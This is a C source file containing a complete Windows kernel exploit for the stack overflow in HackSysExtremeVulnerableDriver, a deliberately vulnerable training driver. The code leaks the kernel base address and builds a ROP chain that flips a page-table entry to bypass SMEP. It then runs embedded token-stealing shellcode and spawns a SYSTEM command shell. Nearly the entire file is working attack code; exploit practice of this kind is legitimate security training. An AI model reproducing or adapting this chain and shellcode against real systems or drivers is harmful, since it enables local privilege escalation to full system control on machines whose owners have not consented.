#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <windows.h>
#include <psapi.h>

// I/O Request Packets (IRPs)
#define TRIGGER_BUFFER_OVERFLOW_STACK 0x222003

#define BUFFER_SIZE 4242

uint64_t GetKernelBaseAddress()
{
    ULONG_PTR pKernelBaseAddress = 0;
    LPVOID *lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Failed to calculate bytes needed for device driver entries");
        return -1;
    }

    if (!(lpImageBase = (LPVOID *)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Failed to allocate heap for lpImageBase\n");
        if (lpImageBase) {
            HeapFree(GetProcessHeap(), 0, lpImageBase);
        }
        return -1;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] EnumDeviceDrivers: %d", GetLastError());
        if (lpImageBase) {
            HeapFree(GetProcessHeap(), 0, lpImageBase);
        }
        return -1;
    }

    pKernelBaseAddress = ((ULONG_PTR *)lpImageBase)[0];
    HeapFree(GetProcessHeap(), 0, lpImageBase);

    printf("[*] Kernel Base Address: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}

void GenerateBuffer(int64_t *buffer, int64_t kernel_base, LPVOID shellcode)
{
    int64_t i = 259;
    int64_t j = 0;

    printf("[*] Generating buffer to bypass VPS and disable SMEP\n");

    /* Prepare RDX register for later. This is needed for the XOR operation */
    buffer[i++] = kernel_base + 0x3f99ce; // pop rdx ; pop rax ; pop rcx ; ret [nt]
    buffer[i++] =               0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR
    buffer[i++] =               0x000000; // [filler]
    buffer[i++] =               0x000000; // [filler]

    /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
       userland code. The setup is as follows:
  
         RAX -> VOID *MiGetPteAddress(
           ( RCX == PTE / Userland Code )
         );

       Once the call is complete RAX should contain the pointer to our PTE. */
    buffer[i++] = kernel_base + 0xa74d93; // pop rcx ; ret     [nt]
    buffer[i++] = (int64_t)shellcode;     // *shellcode        [nt]
    buffer[i++] = kernel_base + 0x26b560; // MiGetPteAddress() [nt]

    /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
       mark the page as a kernel page (U -> K). We can do this using XOR ;) */
    buffer[i++] = kernel_base + 0x2ffbfb; // sub rax, rdx ; ret                [nt]
    buffer[i++] = kernel_base + 0xa6f2f5; // push rax ; pop rbx ; ret          [nt]
    buffer[i++] = kernel_base + 0x3f99ce; // pop rdx ; pop rax ; pop rcx ; ret [nt]
    buffer[i++] =               0x000004; // When we XOR the PTE by 0x4 we flip the 2nd bit (U -> K)
    buffer[i++] =               0x000000; // [filler]
    buffer[i++] =               0x000000; // [filler]
    buffer[i++] = kernel_base + 0x2107b2; // xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt]

    /* Now we can spray our shellcode address since SMEP and VPS should be bypassed */
    for (j = 0; j < 0xC; j++) {
        buffer[i++] = (int64_t)shellcode;
    }

    printf("[*] Calling shellcode: 0x%p\n", shellcode);
}

int main()
{
    HANDLE hHEVD                          = NULL;
    DWORD bytesReturned                   = 0;
    int64_t buffer[BUFFER_SIZE]           = {0};
    int64_t kernelBaseAddr                = 0;
    LPVOID lpMemory                       = NULL;

    char shellcode[] =
    // python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint
    "\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00" // movabs rax, qword ptr gs:[0x188]
    "\x48\x8b\x80\xb8\x00\x00\x00"                 // mov rax, qword ptr [rax + 0xb8]
    "\x48\x89\xc1"                                 // mov rcx, rax
    "\xb2\x04"                                     // mov dl, 4
    "\x48\x8b\x80\x48\x04\x00\x00"                 // mov rax, qword ptr [rax + 0x448]
    "\x48\x2d\x48\x04\x00\x00"                     // sub rax, 0x448
    "\x38\x90\x40\x04\x00\x00"                     // cmp byte ptr [rax + 0x440], dl
    "\x75\xeb"                                     // jne 0x1017
    "\x48\x8b\x90\xb8\x04\x00\x00"                 // mov rdx, qword ptr [rax + 0x4b8]
    "\x48\x89\x91\xb8\x04\x00\x00"                 // mov qword ptr [rcx + 0x4b8], rdx
 
    // python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint
    "\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00" // movabs rax, qword ptr gs:[0x188]
    "\x66\x8b\x88\xe4\x01\x00\x00"                 // mov cx, word ptr [rax + 0x1e4]
    "\x66\xff\xc1"                                 // inc cx
    "\x66\x89\x88\xe4\x01\x00\x00"                 // mov word ptr [rax + 0x1e4], cx
    "\x48\x8b\x90\x90\x00\x00\x00"                 // mov rdx, qword ptr [rax + 0x90]
    "\x48\x8b\x8a\x68\x01\x00\x00"                 // mov rcx, qword ptr [rdx + 0x168]
    "\x4c\x8b\x9a\x78\x01\x00\x00"                 // mov r11, qword ptr [rdx + 0x178]
    "\x48\x8b\xa2\x80\x01\x00\x00"                 // mov rsp, qword ptr [rdx + 0x180]
    "\x48\x8b\xaa\x58\x01\x00\x00"                 // mov rbp, qword ptr [rdx + 0x158]
    "\x31\xc0"                                     // xor eax, eax
    "\x0f\x01\xf8"                                 // swapgs 
    "\x48\x0f\x07";                                // sysretq


    int shellcodeLength = (58 + 71);

    kernelBaseAddr = GetKernelBaseAddress();

    printf("[*] Getting a handle on HEVD\n");

    hHEVD = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                        (GENERIC_READ | GENERIC_WRITE),
                        0x00,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,
                        NULL);

    if (hHEVD == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to get a handle on HackSysExtremeVulnerableDriver\n");
        return -1;
    }

    printf("[*] Allocating RWX memory\n");
    lpMemory = VirtualAlloc(NULL,
                            shellcodeLength,
                            (MEM_COMMIT | MEM_RESERVE),
                            PAGE_EXECUTE_READWRITE);

    printf("[*] Copying shellcode into RWX memory\n");
    memcpy(lpMemory, shellcode, shellcodeLength);

    printf("[*] Spraying return address: 0x%p\n", lpMemory);
    GenerateBuffer(buffer, kernelBaseAddr, lpMemory);

    printf("[*] Triggering control code 0x222003\n");
    DeviceIoControl(hHEVD,
                    TRIGGER_BUFFER_OVERFLOW_STACK,
                    buffer,
                    BUFFER_SIZE,
                    NULL,
                    0x00,
                    &bytesReturned,
                    NULL);

    system("C:\\Windows\\System32\\cmd.exe");
}
